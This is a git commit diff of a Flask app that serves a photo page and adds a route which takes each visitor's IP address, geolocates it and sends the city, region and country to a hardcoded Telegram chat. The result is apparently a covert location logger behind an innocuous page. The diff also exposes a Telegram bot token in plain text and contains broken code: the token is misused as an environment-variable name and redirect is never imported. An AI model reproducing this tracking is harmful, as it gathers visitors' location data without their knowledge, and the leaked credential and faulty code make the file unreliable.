8a01f46213de7ae27d759568b56391ddc87efb71
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-24 16:17:59 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,24 +1,40 @@
-from flask import Flask, jsonify
 import os
+import requests
+from flask import Flask, render_template, request
 from telegram import Bot
 
 app = Flask(__name__)
 
-
-
 # Set up your Telegram bot token
-bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+bot_token = os.environ['5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg']
 
 # Create a bot instance
 bot = Bot(token=bot_token)
 
 @app.route('/')
-def send_message():
-    # Send a message to the chat
-    chat_id = 'localipy'
-    bot.send_message(chat_id=chat_id, text='Hello, world!')
-    return 'Message sent!'
+def index():
+    # Display the photos on the HTML page
+    photos = ['photo1.jpg', 'photo2.jpg', 'photo3.jpg']
+    return render_template('index.html', photos=photos)
 
+@app.route('/send_location', methods=['POST'])
+def send_location():
+    # Retrieve the user's IP address from the request
+    ip_address = request.remote_addr
+
+    # Make a request to the GeoIP API to get the location data
+    location_response = requests.get(f'https://freegeoip.app/json/{ip_address}')
+    location_data = location_response.json()
+
+    # Build the message text
+    message_text = f"Your location: {location_data['city']}, {location_data['region_name']}, {location_data['country_name']}"
+
+    # Send the message to the Telegram bot
+    chat_id = '373715044'
+    bot.send_message(chat_id=chat_id, text=message_text)
+
+    # Redirect the user back to the homepage
+    return redirect('/')
 
 if __name__ == '__main__':
-    app.run(debug=True, port=os.getenv("PORT", default=5000))
+    app.run()
